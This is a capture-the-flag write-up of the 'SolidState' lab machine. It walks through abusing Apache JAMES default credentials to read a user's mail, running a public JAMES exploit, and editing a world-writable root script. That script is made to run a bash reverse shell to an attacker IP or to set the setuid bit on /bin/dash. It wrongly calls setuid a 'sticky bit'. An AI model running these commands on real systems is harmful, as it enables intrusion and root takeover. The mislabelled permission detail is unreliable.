#box #JAMES #ReverseShell #sticky-bit

>* Adding sticky bits to root binaries when possible permits to use the binary as a root user, that opens a good amount of vectors to perform privilege escalation
>* Always read exploit documentation and comments properly to understand what it does in depth
>* DO NOT FORGET `bash -c` before a bash command to execute it as bash code.

Solidstate is a medium machine that involves an interaction with SMTP, POP3 and RSIP. On RSIP there's a tool called JAMES from Apache which is a SMTP Server. This specific version has a vulnerability that permits the creation of a custom user to achieve RCE whenever an user then authenticates through a service such as SSH. While on JAMES we realize that the default user is being used `root:root` and we then realize that `listusers` provide us a list of available user on the system. Moreover, the command `setpassword` permits us to change passwords of each user listed and by then authenticating, with each, on POP3 we're finally able to retrieve a password within the user `mindy`. Once found the password, we inject the exploit and authenticate as mandy, obtaining a reverse shell to escape the default `rbash` (restricted bash) environment we'd have had through SSH. On the machine we discover the presence of a world-writable file called `/opt/tmp.py` that we leverage to add a sticky bit on the binary `/bin/dash` to privilege escalate to root.
## Nmap

```bash
# Nmap 7.95 scan initiated Tue Sep  9 16:07:09 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.130.118
Nmap scan report for 10.129.130.118
Host is up (0.051s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3?
119/tcp open  nntp?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  9 16:13:14 2025 -- 1 IP address (1 host up) scanned in 365.52 seconds
```

By scanning with `-Pn` all the ports we discover the presence of port `4555`

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 13:40 EDT # nmap -Pn -p- 10.129.128.120 
Nmap scan report for 10.129.128.120
Host is up (0.085s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 53.70 seconds
```

## 4555 - RSIP / 110 - POP3

By connecting with netcat on port 4555 `nc -nv 4555` we find the presence of a service called `JAMES` (Java Apache Mail Enterprise Server). It immediately asks for a login ID. We discover online that its default credentials are `root:root` so we opt to authenticate with it, successfully.
Once inside, with the `help` command we discover a variety of commands we can try to use in our favor.
First of all, we use `listusers` to effectively discover the available users on the system. Then, we try to change the password of the email of each of it to successfully authenticate inside POP3 and check their email with `setpassword`. By iterating on each user, we discover the presence of the user `mindy` with the following email stored:

```text
Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first
login.  Your access is restricted at the moment, feel free to ask your supervisor to add any
commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

We apparently now have the credentials to connect through ssh `mindy:P@55W0rd1!2@`. 
Looking online we discover a vulnerability for JAMES Remote Admin 2.3.2, precisely the following [one](https://www.exploit-db.com/exploits/50347).
This exploit basically uses RSIP to:
* Create a new user
* Send an email with a malicious payload inside that will trigger a RCE whenever an user authenticates through a protocol (such as SSH)
We copy this exploit on our end and we then execute it:

```bash
python3 exploit.py 10.129.128.120 10.10.16.55 4445
```

After a minute, the process finishes and we can now try to authenticate in SSH, triggering the payload and obtaining an unrestricted shell.

>The reason why we need to execute this payload is to escape the restricted shell. If we check for our user on `/etc/passwd` we'll notice it uses `/bin/rbash` which stands for `restricted bash`. This shell forbid us to use a lot of commands making the SSH connection pretty useless to further escalate in the system. This exploit executes a command when we authenticate that escapes the shell and permits us to use a normal bash shell.

## Privilege Escalation

To escalate in the system, we discover the presence of a `/opt/tmp.py` file which is world-writable and owner by user. We could try to use it to obtain a reverse shell or eventually to add a sticky bit to a binary that can grant us a privilege escalation.

### Reverse Shell

To obtain a reverse shell we can update the file with the following command:

```bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.55/4445 0>&1'
```

Full file:

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system("bash -c '/bin/bash -i >& /dev/tcp/10.10.16.55/4445 0>&1'")
except:
     sys.exit()
```
### Sticky bit

To obtain a privileged shell with the sticky bit, since we cannot set the sticky bit to bash, we can do that on `sh` (it's symlinked to `dash` so adding the sticky bit to `sh` will assign it to `dash`) or on `dash`:

```bash
chmod 4755 /bin/sh
# or
chmod 4755 /bin/dash
```

Full file:

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system("chmod 4755 /bin/sh")
except:
     sys.exit()
```

And then use `/bin/sh` or `/bin/dash` to obtain a privileged shell as root.